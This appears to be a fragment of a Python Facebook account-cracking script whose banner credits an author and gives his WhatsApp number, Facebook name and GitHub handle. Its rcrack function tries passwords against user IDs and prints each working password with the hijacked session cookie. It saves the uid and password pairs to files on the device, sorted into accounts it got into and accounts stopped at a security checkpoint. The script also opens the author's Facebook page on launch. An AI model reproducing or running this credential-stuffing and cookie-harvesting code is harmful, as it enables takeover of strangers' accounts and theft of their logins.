...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/arafatyou248?mibextid=D4KYlr')
...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
 \x1b[1;96m┏─══─━══─══━─══─| ✠ |─══━─══─══━─══─┓
\x1b[38;5;46m┃AUTHOR    ; ARAFAT HOSSAIN  
\x1b[1;93m┃WHATSAPP  ; +8801795194671       
\x1b[1;95m┃FACEBOOK  ; ARAFAT HOSAN        
\x1b[1;91m┃GITHUB    ; ARAFAT-CYBER-143       
\x1b[1;96m┗─══─━════─━─══─| ✠ |─══━─══─══━─══─┛
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[sexy-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 "CONGESTION YOU HAVE A OK IDS"') 
                cek_apk(session,coki)
                open('/sdcard/sexy-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[sexy-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/sexy-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}sexy{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
